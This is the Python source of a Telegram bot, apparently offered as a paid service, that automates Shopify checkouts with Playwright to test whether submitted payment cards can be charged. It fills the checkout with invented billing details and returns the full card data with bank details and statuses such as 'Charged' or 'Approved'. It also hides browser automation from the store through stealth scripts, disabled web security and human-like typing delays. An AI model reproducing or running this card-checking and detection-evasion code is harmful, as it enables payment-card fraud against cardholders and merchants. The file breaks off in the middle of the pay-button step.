# BOT/gates/charge/shopify/shopify_direct.py
# Shopify Charge Gateway - HUMAN-LIKE PLAYWRIGHT CHECKOUT

import json
import asyncio
import re
import time
import random
import string
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message
import html
import os

# Import from helper modules
try:
    from BOT.helper.permissions import auth_and_free_restricted
except ImportError:
    def auth_and_free_restricted(func):
        async def wrapper(client, message):
            return await func(client, message)
        return wrapper

try:
    from BOT.helper.Admins import is_command_disabled, get_command_offline_message
except ImportError:
    def is_command_disabled(command_name: str) -> bool:
        return False
    def get_command_offline_message(command_name: str) -> str:
        return "Command is temporarily disabled."

try:
    from BOT.gc.credit import charge_processor
    CHARGE_PROCESSOR_AVAILABLE = True
except ImportError:
    charge_processor = None
    CHARGE_PROCESSOR_AVAILABLE = False

try:
    from TOOLS.getbin import get_bin_details
except ImportError:
    def get_bin_details(bin_number):
        return {}

# Playwright imports
try:
    from playwright.async_api import async_playwright, expect, TimeoutError as PlaywrightTimeout
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

# ========== DETAILED LOGGER ==========
class ShopifyLogger:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.check_id = f"SHOP-{random.randint(1000, 9999)}"
        self.start_time = None
        self.step_counter = 0
        self.logs = []

    def start_check(self, card_details):
        self.start_time = time.time()
        self.step_counter = 0
        cc = card_details.split('|')[0] if '|' in card_details else card_details
        masked_cc = cc[:6] + "******" + cc[-4:] if len(cc) > 10 else cc

        log_msg = f"""
🛒 [SHOPIFY HUMAN CHECKOUT - PLAYWRIGHT]
   ├── Check ID: {self.check_id}
   ├── User ID: {self.user_id or 'N/A'}
   ├── Card: {masked_cc}
   ├── Start Time: {datetime.now().strftime('%H:%M:%S')}
   └── Target: meta-app-prod-store-1.myshopify.com
        """
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def add_log(self, message):
        timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
        self.logs.append(f"[{timestamp}] {message}")

    def step(self, step_num, step_name, action, details=None, status="PROCESSING"):
        self.step_counter += 1
        elapsed = time.time() - self.start_time if self.start_time else 0

        status_icons = {
            "PROCESSING": "🔄", "SUCCESS": "✅", "FAILED": "❌",
            "WARNING": "⚠️", "INFO": "ℹ️", "CAPTCHA": "🛡️",
            "DECLINED": "⛔", "HUMAN": "👤", "CLICK": "🖱️",
            "TYPE": "⌨️", "WAIT": "⏳"
        }
        status_icon = status_icons.get(status, "➡️")

        log_msg = f"{status_icon} STEP {step_num:02d}: {step_name}"
        log_msg += f"\n   ├── Action: {action}"
        log_msg += f"\n   ├── Elapsed: {elapsed:.2f}s"
        log_msg += f"\n   ├── Time: {datetime.now().strftime('%H:%M:%S')}"
        if details:
            log_msg += f"\n   └── Details: {details}"

        self.add_log(log_msg)
        print(log_msg)
        print()
        return log_msg

    def human_action(self, action_type, element, value=None):
        elapsed = time.time() - self.start_time if self.start_time else 0
        status = "CLICK" if action_type == "click" else "TYPE" if action_type == "type" else "WAIT"
        icon = {"CLICK": "🖱️", "TYPE": "⌨️", "WAIT": "⏳"}.get(status, "👤")

        value_str = f" -> '{value}'" if value else ""
        log_msg = f"{icon} HUMAN ACTION [{action_type.upper()}]: {element}{value_str} | Elapsed: {elapsed:.2f}s"
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def data_extracted(self, data_type, value, source=""):
        if isinstance(value, dict):
            value_str = json.dumps(value, indent=2)
            if len(value_str) > 150:
                value_str = value_str[:147] + "..."
        else:
            value_str = str(value)
            if len(value_str) > 100:
                value_str = value_str[:97] + "..."

        log_msg = f"   ├── 📊 Extracted {data_type}: {value_str}"
        if source:
            log_msg += f"\n   │   └── From: {source}"
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def card_details_log(self, cc, mes, ano, cvv):
        masked_cc = cc[:6] + "******" + cc[-4:]
        log_msg = f"""
   ├── 💳 Card Details:
   │   ├── Number: {masked_cc}
   │   ├── Expiry: {mes}/{ano}
   │   └── CVV: {'*' * len(cvv)}
        """
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def error_log(self, error_type, message, step=""):
        error_icons = {
            "CAPTCHA": "🛡️", "DECLINED": "💳", "FRAUD": "🚫",
            "TIMEOUT": "⏰", "CONNECTION": "🔌", "UNKNOWN": "❓"
        }
        error_icon = error_icons.get(error_type, "⚠️")
        log_msg = f"{error_icon} ERROR [{error_type}]: {message}"
        if step:
            log_msg += f"\n   └── At Step: {step}"
        self.add_log(log_msg)
        print(log_msg)
        print()
        return log_msg

    def success_log(self, message, details=""):
        log_msg = f"✅ SUCCESS: {message}"
        if details:
            log_msg += f"\n   └── Details: {details}"
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def warning(self, message):
        log_msg = f"⚠️ WARNING: {message}"
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def complete_result(self, success, final_status, response_message, total_time):
        result_icon = "✅" if success else "❌"
        result_text = "APPROVED" if success else "DECLINED"

        if len(response_message) > 100:
            response_display = response_message[:97] + "..."
        else:
            response_display = response_message

        log_msg = f"""
{result_icon} [SHOPIFY HUMAN CHECKOUT COMPLETED]
   ├── Check ID: {self.check_id}
   ├── Result: {result_text}
   ├── Final Status: {final_status}
   ├── Steps Completed: {self.step_counter}
   ├── Total Time: {total_time:.2f}s
   ├── Response: {response_display}
   └── End Time: {datetime.now().strftime('%H:%M:%S')}
        """
        summary = f"📊 SUMMARY: {result_icon} {final_status} | {total_time:.2f}s | Steps: {self.step_counter}"
        self.add_log(log_msg)
        self.add_log(summary)
        print(log_msg)
        print(summary)
        print("="*80)
        return log_msg, summary

    def get_all_logs(self):
        return "\n".join(self.logs)


# ========== UTILITY FUNCTIONS ==========
def load_users():
    try:
        with open("DATA/users.json", "r") as f:
            return json.load(f)
    except:
        return {}

def load_owner_id():
    try:
        with open("FILES/config.json", "r") as f:
            return json.load(f).get("OWNER")
    except:
        return None

def get_user_plan(user_id):
    users = load_users()
    if str(user_id) in users:
        return users[str(user_id)].get("plan", {})
    return {}

def is_user_banned(user_id):
    try:
        if not os.path.exists("DATA/banned_users.txt"):
            return False
        with open("DATA/banned_users.txt", "r") as f:
            return str(user_id) in f.read().splitlines()
    except:
        return False

def check_cooldown(user_id, command_type="sh"):
    owner_id = load_owner_id()
    if str(user_id) == str(owner_id):
        return True, 0

    try:
        with open("DATA/cooldowns.json", "r") as f:
            cooldowns = json.load(f)
    except:
        cooldowns = {}

    user_key = f"{user_id}_{command_type}"
    current_time = time.time()

    if user_key in cooldowns:
        last_time = cooldowns[user_key]
        user_plan = get_user_plan(user_id)
        antispam = user_plan.get("antispam", 15) or 15

        if current_time - last_time < antispam:
            return False, antispam - (current_time - last_time)

    cooldowns[user_key] = current_time
    try:
        with open("DATA/cooldowns.json", "w") as f:
            json.dump(cooldowns, f, indent=4)
    except:
        pass

    return True, 0


# ========== FORMAT RESPONSE FUNCTION ==========
def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, user_data):
    fullcc = f"{cc}|{mes}|{ano}|{cvv}"

    try:
        user_id = str(user_data.get("user_id", "Unknown"))
    except:
        user_id = None

    try:
        with open("DATA/sites.json", "r") as f:
            sites = json.load(f)
        gateway = sites.get(user_id, {}).get("gate", "Shopify Self Site 💷")
    except:
        gateway = "Shopify Self Site 💷"

    raw_response = str(raw_response) if raw_response else "-"
    raw_response_upper = raw_response.upper()

    # Check for SUCCESS indicators
    if any(keyword in raw_response_upper for keyword in [
        "ORDER_PLACED", "SUBMITSUCCESS", "SUCCESSFUL", "APPROVED", "RECEIPT",
        "COMPLETED", "PAYMENT_SUCCESS", "CHARGE_SUCCESS", "THANK_YOU",
        "ORDER_CONFIRMATION", "YOUR_ORDER_IS_CONFIRMED", "ORDER_CONFIRMED",
        "SHOPIFY_PAYMENTS", "SHOP_PAY", "CHARGED", "LIVE", "ORDER_CONFIRMED",
        "ORDER #", "PROCESSEDRECEIPT", "THANK YOU", "PAYMENT_SUCCESSFUL",
        "PROCESSINGRECEIPT", "AUTHORIZED", "YOUR ORDER IS CONFIRMED"
    ]):
        status_flag = "Charged 💎"
    # Check for CAPTCHA
    elif any(keyword in raw_response_upper for keyword in [
        "CAPTCHA", "SOLVE THE CAPTCHA", "CAPTCHA_METADATA_MISSING", 
        "CAPTCHA DETECTED", "CAPTCHA_REQUIRED", "CAPTCHA_VALIDATION_FAILED", 
        "CAPTCHA_ERROR", "BOT_DETECTED", "HUMAN_VERIFICATION", "SECURITY_CHECK",
        "HCAPTCHA", "CLOUDFLARE", "ENTER PAYMENT INFORMATION AND SOLVE",
        "RECAPTCHA", "I'M NOT A ROBOT", "PLEASE VERIFY"
    ]):
        status_flag = "Captcha ⚠️"
    # Check for PAYMENT ERROR
    elif any(keyword in raw_response_upper for keyword in [
        "THERE WAS AN ISSUE PROCESSING YOUR PAYMENT", "PAYMENT ISSUE",
        "ISSUE PROCESSING", "PAYMENT ERROR", "PAYMENT PROBLEM",
        "TRY AGAIN OR USE A DIFFERENT PAYMENT METHOD", "CARD WAS DECLINED",
        "YOUR PAYMENT COULDN'T BE PROCESSED", "PAYMENT FAILED"
    ]):
        status_flag = "Declined ❌"
    # Check for INSUFFICIENT FUNDS
    elif any(keyword in raw_response_upper for keyword in [
        "INSUFFICIENT FUNDS", "INSUFFICIENT_FUNDS", "FUNDS", "NOT ENOUGH MONEY"
    ]):
        status_flag = "Declined ❌"
    # Check for INVALID CARD
    elif any(keyword in raw_response_upper for keyword in [
        "INVALID CARD", "CARD IS INVALID", "CARD_INVALID", "CARD NUMBER IS INVALID"
    ]):
        status_flag = "Declined ❌"
    # Check for EXPIRED CARD
    elif any(keyword in raw_response_upper for keyword in [
        "EXPIRED", "CARD HAS EXPIRED", "CARD_EXPIRED", "EXPIRATION DATE"
    ]):
        status_flag = "Declined ❌"
    # Check for 3D Secure
    elif any(keyword in raw_response_upper for keyword in [
        "3D", "AUTHENTICATION", "OTP", "VERIFICATION", "CVV-MATCH-OTP", 
        "3DS", "PENDING", "SECURE REQUIRED", "SECURE_CODE", "AUTH_REQUIRED",
        "3DS REQUIRED", "AUTHENTICATION_FAILED", "COMPLETEPAYMENTCHALLENGE",
        "ACTIONREQUIREDRECEIPT", "ADDITIONAL_VERIFICATION_NEEDED",
        "VERIFICATION_REQUIRED", "CARD_VERIFICATION", "AUTHENTICATE"
    ]):
        status_flag = "Approved ❎"
    # Check for CVV errors
    elif any(keyword in raw_response_upper for keyword in [
        "INVALID CVC", "INCORRECT CVC", "CVC_INVALID", "CVV", "SECURITY CODE"
    ]):
        status_flag = "Declined ❌"
    # Check for fraud
    elif any(keyword in raw_response_upper for keyword in [
        "FRAUD", "FRAUD_SUSPECTED", "SUSPECTED_FRAUD", "FRAUDULENT",
        "RISKY", "HIGH_RISK", "SECURITY_VIOLATION", "SUSPICIOUS"
    ]):
        status_flag = "Fraud ⚠️"
    # Default to declined
    else:
        status_flag = "Declined ❌"

    # BIN lookup
    bin_data = get_bin_details(cc[:6]) or {}
    bin_info = {
        "bin": bin_data.get("bin", cc[:6]),
        "country": bin_data.get("country", "Unknown"),
        "flag": bin_data.get("flag", "🏳️"),
        "vendor": bin_data.get("vendor", "Unknown"),
        "type": bin_data.get("type", "Unknown"),
        "level": bin_data.get("level", "Unknown"),
        "bank": bin_data.get("bank", "Unknown")
    }

    try:
        plan = user_data.get("plan", {}).get("plan", "Free")
        badge = user_data.get("plan", {}).get("badge", "🎭")
        first_name = user_data.get("first_name", "User")
    except:
        plan = "Free"
        badge = "🎭"
        first_name = "User"

    clean_name = re.sub(r'[↑←«~∞🏴]', '', first_name).strip()
    profile_display = f"『{badge}』{clean_name}"

    result = f"""
<b>[#Shopify Charge] | WAYNE</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{fullcc}</code>
<b>[•] Gateway</b> - <b>Shopify Charge 0.55$</b>
<b>[•] Status</b>- <code>{status_flag}</code>
<b>[•] Response</b>- <code>{raw_response}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Bin</b>: <code>{bin_info['bin']}</code>  
<b>[+] Info</b>: <code>{bin_info['vendor']} - {bin_info['type']} - {bin_info['level']}</code> 
<b>[+] Bank</b>: <code>{bin_info['bank']}</code> 🏦
<b>[+] Country</b>: <code>{bin_info['country']} - [{bin_info['flag']}]</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[ﾒ] Checked By</b>: {profile_display} [<code>{plan} {badge}</code>]
<b>[ϟ] Dev</b> ➺</b> <b><i>DADYY</i></b>
━━━━━━━━━━━━━━━
<b>[ﾒ] T/t</b>: <code>[{timet:.2f} 𝐬]</code> <b>|P/x:</b> [<code>Live ⚡️</code>]
"""
    return result


# ========== HUMAN-LIKE PLAYWRIGHT CHECKOUT CLASS ==========
class ShopifyHumanCheckout:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.base_url = "https://meta-app-prod-store-1.myshopify.com"
        self.product_handle = "retailer-id-fix-no-mapping"
        self.product_url = f"{self.base_url}/products/{self.product_handle}"

        # Fixed email as requested
        self.email = "brucewayne0002@gmail.com"

        # Random user details for billing
        self.first_names = ["James", "Robert", "John", "Michael", "David", "William", "Richard", 
                           "Joseph", "Thomas", "Charles", "Daniel", "Matthew", "Anthony", "Mark", 
                           "Donald", "Steven", "Paul", "Andrew", "Kenneth", "Joshua", "Kevin", 
                           "Brian", "George", "Timothy", "Ronald", "Edward", "Jason", "Jeffrey"]
        self.last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", 
                          "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", 
                          "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", 
                          "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark"]

        self.first_name = random.choice(self.first_names)
        self.last_name = random.choice(self.last_names)
        self.full_name = f"{self.first_name} {self.last_name}"

        # Phone number
        self.phone = f"215{random.randint(100, 999)}{random.randint(1000, 9999)}"

        # Address details - Using the requested address
        self.address = {
            "first_name": self.first_name,
            "last_name": self.last_name,
            "address1": "8 Log Pond Drive",
            "address2": "",  # Apartment optional - leave empty
            "city": "Horsham",
            "state": "Pennsylvania",  # Full state name for dropdown
            "state_code": "PA",  # Code for verification
            "zip": "19044",
            "country": "United States"
        }

        self.logger = ShopifyLogger(user_id)
        self.browser = None
        self.context = None
        self.page = None
        self.checkout_url = None

    async def random_delay(self, min_ms=500, max_ms=2000):
        """Human-like random delay between actions"""
        delay = random.randint(min_ms, max_ms)
        await asyncio.sleep(delay / 1000)

    async def human_type(self, selector, text, page=None):
        """Type like a human with random delays between keystrokes"""
        if page is None:
            page = self.page

        self.logger.human_action("type", selector, text[:3] + "***" if len(text) > 6 else text)

        # Click first to focus
        await page.click(selector)
        await self.random_delay(100, 300)

        # Clear existing text
        await page.keyboard.press("Control+a")
        await page.keyboard.press("Delete")
        await self.random_delay(50, 150)

        # Type with human-like speed
        for char in text:
            await page.keyboard.press(char)
            await asyncio.sleep(random.uniform(0.05, 0.15))

        await self.random_delay(200, 500)

    async def human_click(self, selector, page=None):
        """Click like a human with random delay"""
        if page is None:
            page = self.page

        self.logger.human_action("click", selector)

        # Move mouse to element first (simulated)
        await page.hover(selector)
        await self.random_delay(100, 400)

        # Click
        await page.click(selector)
        await self.random_delay(300, 800)

    async def wait_for_element(self, selector, timeout=10000, state="visible"):
        """Wait for element with logging"""
        self.logger.step(0, "WAITING", f"Waiting for element: {selector}", f"Timeout: {timeout}ms", "WAIT")
        try:
            if state == "visible":
                await expect(self.page.locator(selector).first).to_be_visible(timeout=timeout)
            elif state == "hidden":
                await expect(self.page.locator(selector).first).to_be_hidden(timeout=timeout)
            return True
        except PlaywrightTimeout:
            self.logger.warning(f"Timeout waiting for element: {selector}")
            return False

    async def extract_error_message(self):
        """Extract error message from page"""
        error_selectors = [
            '[data-testid="error-message"]',
            '.field__message--error',
            '.notice--error',
            '.errors',
            '[role="alert"]',
            '.form-message--error',
            '.payment-errors',
            '.error-message'
        ]

        for selector in error_selectors:
            try:
                element = self.page.locator(selector).first
                if await element.is_visible(timeout=2000):
                    text = await element.text_content()
                    if text and text.strip():
                        return text.strip()
            except:
                continue

        # Check for specific Shopify error patterns in page content
        page_content = await self.page.content()

        # Look for common error patterns
        error_patterns = [
            r'"errorMessage":"([^"]+)"',
            r'error-message[^>]*>([^<]+)',
            r'class="[^"]*error[^"]*"[^>]*>([^<]+)',
            r'There was an issue processing your payment[^<]*',
            r'Your card was declined[^<]*',
            r'Invalid card number[^<]*'
        ]

        for pattern in error_patterns:
            match = re.search(pattern, page_content, re.IGNORECASE)
            if match:
                return match.group(1).strip()

        return None

    async def check_for_captcha(self):
        """Check if captcha is present"""
        captcha_selectors = [
            'iframe[src*="captcha"]',
            'iframe[src*="hcaptcha"]',
            'iframe[src*="recaptcha"]',
            '.h-captcha',
            '.g-recaptcha',
            '[data-testid="captcha"]',
            'input[name="captcha"]',
            'text=I\'m not a robot',
            'text=Verify you are human'
        ]

        for selector in captcha_selectors:
            try:
                if await self.page.locator(selector).first.is_visible(timeout=2000):
                    return True
            except:
                continue

        # Check URL for captcha indicators
        current_url = self.page.url
        if any(x in current_url.lower() for x in ['captcha', 'challenge', 'verify']):
            return True

        return False

    async def execute_checkout(self, cc, mes, ano, cvv):
        """Execute human-like checkout using Playwright"""
        if not PLAYWRIGHT_AVAILABLE:
            return False, "PLAYWRIGHT_NOT_INSTALLED - Please install playwright"

        async with async_playwright() as p:
            # Launch browser with human-like settings
            self.logger.step(1, "BROWSER LAUNCH", "Starting Chromium browser", "Human-like settings", "HUMAN")

            self.browser = await p.chromium.launch(
                headless=True,  # Set to False for debugging
                args=[
                    '--disable-blink-features=AutomationControlled',
                    '--disable-web-security',
                    '--disable-features=IsolateOrigins,site-per-process',
                    '--disable-site-isolation-trials'
                ]
            )

            # Create context with realistic viewport and locale
            self.context = await self.browser.new_context(
                viewport={'width': 1920, 'height': 1080},
                locale='en-US',
                timezone_id='America/New_York',
                geolocation={'latitude': 40.1807, 'longitude': -75.1448},
                permissions=['geolocation'],
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            )

            # Add stealth scripts to avoid detection
            await self.context.add_init_script("""
                Object.defineProperty(navigator, 'webdriver', {
                    get: () => undefined
                });
                Object.defineProperty(navigator, 'plugins', {
                    get: () => [1, 2, 3, 4, 5]
                });
                window.chrome = { runtime: {} };
            """)

            self.page = await self.context.new_page()

            try:
                # Step 1: Go to homepage
                self.logger.step(2, "LOAD HOMEPAGE", "Navigating to store homepage", self.base_url, "HUMAN")
                await self.page.goto(self.base_url, wait_until="networkidle", timeout=30000)
                await self.random_delay(1000, 2500)

                # Step 2: Navigate to product page
                self.logger.step(3, "LOAD PRODUCT", "Finding 'Cup from Mohan\\'s wishlist'", self.product_url, "HUMAN")
                await self.page.goto(self.product_url, wait_until="networkidle", timeout=30000)
                await self.random_delay(1500, 3000)

                # Verify we're on the right product
                product_title = await self.page.locator('h1').first.text_content()
                self.logger.data_extracted("Product Title", product_title, "Page H1")

                if "cup" not in product_title.lower() or "mohan" not in product_title.lower():
                    self.logger.warning("Product title doesn't match expected, but continuing...")

                # Step 3: Add to cart
                self.logger.step(4, "ADD TO CART", "Clicking Add to Cart button", "Product page", "HUMAN")

                # Look for add to cart button
                add_to_cart_selectors = [
                    'button[name="add"]',
                    'button[type="submit"]:has-text("Add to cart")',
                    'button:has-text("Add to cart")',
                    '[data-testid="add-to-cart-button"]',
                    'input[value="Add to cart"]'
                ]

                cart_clicked = False
                for selector in add_to_cart_selectors:
                    try:
                        if await self.page.locator(selector).first.is_visible(timeout=3000):
                            await self.human_click(selector)
                            cart_clicked = True
                            break
                    except:
                        continue

                if not cart_clicked:
                    return False, "Could not find Add to Cart button"

                await self.random_delay(2000, 4000)

                # Step 4: Go to cart and proceed to checkout
                self.logger.step(5, "GO TO CART", "Navigating to cart page", "Preparing checkout", "HUMAN")

                # Click on cart or go directly to checkout
                await self.page.goto(f"{self.base_url}/cart", wait_until="networkidle", timeout=30000)
                await self.random_delay(1500, 2500)

                # Look for checkout button (NOT Shop Pay, NOT GPay, NOT PayPal)
                self.logger.step(6, "CHECKOUT CLICK", "Clicking 'Check out' button (regular checkout)", "Avoiding express checkout", "HUMAN")

                checkout_selectors = [
                    'button[type="submit"]:has-text("Check out")',
                    'button:has-text("Check out")',
                    'input[value="Check out"]',
                    'a[href*="/checkout"]:not([href*="shop_pay"]):not([href*="paypal"])',
                    '[data-testid="checkout-button"]'
                ]

                checkout_clicked = False
                for selector in checkout_selectors:
                    try:
                        if await self.page.locator(selector).first.is_visible(timeout=3000):
                            await self.human_click(selector)
                            checkout_clicked = True
                            break
                    except:
                        continue

                if not checkout_clicked:
                    # Try to navigate directly to checkout
                    self.logger.warning("Checkout button not found, trying direct navigation...")
                    await self.page.goto(f"{self.base_url}/checkout", wait_until="networkidle", timeout=30000)

                await self.random_delay(3000, 5000)

                # Store checkout URL
                self.checkout_url = self.page.url
                self.logger.data_extracted("Checkout URL", self.checkout_url, "Browser URL")

                # Check if we got redirected to shop.app (we don't want that)
                if "shop.app" in self.checkout_url:
                    self.logger.warning("Redirected to shop.app, trying to go back to native checkout...")
                    # Extract checkout token and go directly to native checkout
                    match = re.search(r'/checkouts/([^/?]+)', self.checkout_url)
                    if match:
                        checkout_token = match.group(1)
                        native_url = f"{self.base_url}/checkouts/cn/{checkout_token}?skip_shop_pay=true"
                        await self.page.goto(native_url, wait_until="networkidle", timeout=30000)
                        await self.random_delay(2000, 3000)
                        self.checkout_url = self.page.url

                # Step 5: Fill Email
                self.logger.step(7, "FILL EMAIL", "Entering email address", self.email, "HUMAN")

                email_selectors = [
                    'input[name="checkout[email]"]',
                    'input[name="email"]',
                    'input[type="email"]',
                    'input[placeholder*="email" i]',
                    '#checkout_email',
                    '[data-testid="email-input"]'
                ]

                for selector in email_selectors:
                    try:
                        if await self.page.locator(selector).first.is_visible(timeout=3000):
                            await self.human_type(selector, self.email)
                            break
                    except:
                        continue

                await self.random_delay(800, 1500)

                # Step 6: Select Pickup Option
                self.logger.step(8, "SELECT PICKUP", "Choosing 'Pick up' option", "paris hilton location", "HUMAN")

                # Look for pickup radio button or tab
                pickup_selectors = [
                    'input[type="radio"][value="pickup"]',
                    'label:has-text("Pick up")',
                    'text=Pick up',
                    '[data-testid="pickup-option"]',
                    'button:has-text("Pick up")'
                ]

                for selector in pickup_selectors:
                    try:
                        if await self.page.locator(selector).first.is_visible(timeout=3000):
                            await self.human_click(selector)
                            break
                    except:
                        continue

                await self.random_delay(2000, 4000)

                # Select paris hilton location
                self.logger.step(9, "SELECT LOCATION", "Choosing paris hilton (0 mi) location", "8 Log Pond Drive, Horsham PA", "HUMAN")

                location_selectors = [
                    'label:has-text("paris hilton")',
                    'text=paris hilton',
                    'button:has-text("paris hilton")',
                    '[data-testid="pickup-location"]:has-text("paris hilton")',
                    'input[value*="paris hilton"]'
                ]

                for selector in location_selectors:
                    try:
                        if await self.page.locator(selector).first.is_visible(timeout=3000):
                            await self.human_click(selector)
                            break
                    except:
                        continue

                await self.random_delay(1500, 3000)

                # Step 7: Fill Billing Address
                self.logger.step(10, "FILL BILLING", "Entering billing address details", self.full_name, "HUMAN")

                # Country (should be pre-selected as United States, but verify)
                country_selectors = [
                    'select[name="checkout[billing_address][country]"]',
                    'select[name="country"]',
                    '[data-testid="country-select"]'
                ]

                for selector in country_selectors:
                    try:
                        if await self.page.locator(selector).first.is_visible(timeout=2000):
                            await self.page.select_option(selector, "United States")
                            await self.random_delay(500, 1000)
                            break
                    except:
                        continue

                # First Name
                await self.fill_field_if_present('input[name="checkout[billing_address][first_name]"]', self.first_name)
                await self.fill_field_if_present('input[name="firstName"]', self.first_name)
                await self.fill_field_if_present('input[placeholder*="First name" i]', self.first_name)

                # Last Name
                await self.fill_field_if_present('input[name="checkout[billing_address][last_name]"]', self.last_name)
                await self.fill_field_if_present('input[name="lastName"]', self.last_name)
                await self.fill_field_if_present('input[placeholder*="Last name" i]', self.last_name)

                # Address 1
                await self.fill_field_if_present('input[name="checkout[billing_address][address1]"]', self.address["address1"])
                await self.fill_field_if_present('input[name="address1"]', self.address["address1"])
                await self.fill_field_if_present('input[placeholder*="Address" i]', self.address["address1"])

                # City
                await self.fill_field_if_present('input[name="checkout[billing_address][city]"]', self.address["city"])
                await self.fill_field_if_present('input[name="city"]', self.address["city"])
                await self.fill_field_if_present('input[placeholder*="City" i]', self.address["city"])

                # State - Select from dropdown
                state_selectors = [
                    'select[name="checkout[billing_address][province]"]',
                    'select[name="province"]',
                    'select[name="state"]',
                    '[data-testid="state-select"]'
                ]

                for selector in state_selectors:
                    try:
                        if await self.page.locator(selector).first.is_visible(timeout=2000):
                            # Try to select by value or label
                            try:
                                await self.page.select_option(selector, self.address["state_code"])
                            except:
                                try:
                                    await self.page.select_option(selector, label=self.address["state"])
                                except:
                                    pass
                            await self.random_delay(500, 1000)
                            break
                    except:
                        continue

                # ZIP
                await self.fill_field_if_present('input[name="checkout[billing_address][zip]"]', self.address["zip"])
                await self.fill_field_if_present('input[name="zip"]', self.address["zip"])
                await self.fill_field_if_present('input[placeholder*="ZIP" i]', self.address["zip"])
                await self.fill_field_if_present('input[name="postalCode"]', self.address["zip"])

                # Phone (optional but fill it)
                await self.fill_field_if_present('input[name="checkout[billing_address][phone]"]', self.phone)
                await self.fill_field_if_present('input[name="phone"]', self.phone)
                await self.fill_field_if_present('input[type="tel"]', self.phone)

                await self.random_delay(1500, 2500)

                # Step 8: Select Tip as None
                self.logger.step(11, "SELECT TIP", "Choosing 'None' for tip", "Tip selection", "HUMAN")

                tip_selectors = [
                    'input[type="radio"][value="0"]',
                    'label:has-text("None")',
                    'button:has-text("None")',
                    '[data-testid="tip-option-0"]',
                    'text=None'
                ]

                for selector in tip_selectors:
                    try:
                        if await self.page.locator(selector).first.is_visible(timeout=2000):
                            await self.human_click(selector)
                            break
                    except:
                        continue

                await self.random_delay(1000, 2000)

                # Step 9: Continue to Payment
                self.logger.step(12, "CONTINUE", "Clicking Continue to Payment", "Proceeding to payment page", "HUMAN")

                continue_selectors = [
                    'button[type="submit"]:has-text("Continue")',
                    'button:has-text("Continue to payment")',
                    'button:has-text("Next")',
                    'input[value="Continue"]',
                    '[data-testid="continue-button"]'
                ]

                for selector in continue_selectors:
                    try:
                        if await self.page.locator(selector).first.is_visible(timeout=3000):
                            await self.human_click(selector)
                            break
                    except:
                        continue

                # Wait for payment section to load
                await self.random_delay(3000, 5000)

                # Check for captcha before payment
                if await self.check_for_captcha():
                    return False, "CAPTCHA_REQUIRED - Human verification needed"

                # Step 10: Fill Credit Card Information
                self.logger.step(13, "FILL CARD", "Entering credit card details", "Card number and details", "HUMAN")

                # Card Number
                card_number = cc.replace(" ", "").replace("-", "")

                # Try different card input selectors
                card_selectors = [
                    'input[name="checkout[credit_card][number]"]',
                    'input[name="cardnumber"]',
                    'input[placeholder*="Card number" i]',
                    'input[data-testid="card-number-input"]',
                    'iframe[name*="card"] >> input',
                    '[name="number"]',
                    'input[inputmode="numeric"]'
                ]

                card_filled = False
                for selector in card_selectors:
                    try:
                        if await self.page.locator(selector).first.is_visible(timeout=3000):
                            await self.human_type(selector, card_number)
                            card_filled = True
                            break
                    except Exception as e:
                        continue

                if not card_filled:
                    # Try to find card iframe (common in Shopify)
                    try:
                        frames = self.page.frames
                        for frame in frames:
                            try:
                                card_input = frame.locator('input[name="number"], input[placeholder*="card" i], input[inputmode="numeric"]').first
                                if await card_input.is_visible(timeout=2000):
                                    await card_input.fill(card_number)
                                    card_filled = True
                                    self.logger.success_log("Card filled in iframe")
                                    break
                            except:
                                continue
                    except:
                        pass

                if not card_filled:
                    return False, "Could not find card number input field"

                await self.random_delay(800, 1500)

                # Cardholder Name (random name)
                name_selectors = [
                    'input[name="checkout[credit_card][name]"]',
                    'input[name="name"]',
                    'input[placeholder*="Name on card" i]',
                    'input[placeholder*="Cardholder" i]'
                ]

                for selector in name_selectors:
                    try:
                        if await self.page.locator(selector).first.is_visible(timeout=2000):
                            await self.human_type(selector, self.full_name)
                            break
                    except:
                        continue

                await self.random_delay(600, 1200)

                # Expiry Date
                expiry = f"{mes} / {ano[-2:]}" if len(ano) == 4 else f"{mes} / {ano}"

                expiry_selectors = [
                    'input[name="checkout[credit_card][expiry]"]',
                    'input[name="expiry"]',
                    'input[placeholder*="MM / YY" i]',
                    'input[placeholder*="Expiry" i]',
                    'input[data-testid="expiry-input"]'
                ]

                for selector in expiry_selectors:
                    try:
                        if await self.page.locator(selector).first.is_visible(timeout=2000):
                            await self.human_type(selector, expiry)
                            break
                    except:
                        continue

                await self.random_delay(600, 1200)

                # CVV
                cvv_selectors = [
                    'input[name="checkout[credit_card][verification_value]"]',
                    'input[name="cvv"]',
                    'input[name="cvc"]',
                    'input[placeholder*="CVV" i]',
                    'input[placeholder*="CVC" i]',
                    'input[type="password"]'
                ]

                for selector in cvv_selectors:
                    try:
                        if await self.page.locator(selector).first.is_visible(timeout=2000):
                            await self.human_type(selector, cvv)
                            break
                    except:
                        continue

                await self.random_delay(1500, 2500)

                # Check for captcha before final submission
                if await self.check_for_captcha():
                    return False, "CAPTCHA_REQUIRED - Human verification needed before payment"

                # Step 11: Click Pay Now
                self.logger.step(14, "PAY NOW", "Clicking 'Pay now' button", "Final payment submission", "HUMAN")

                pay_selectors = [
                    'button[type="submit"]:has-text("Pay now")',
                    'button:has-text("Pay $")',
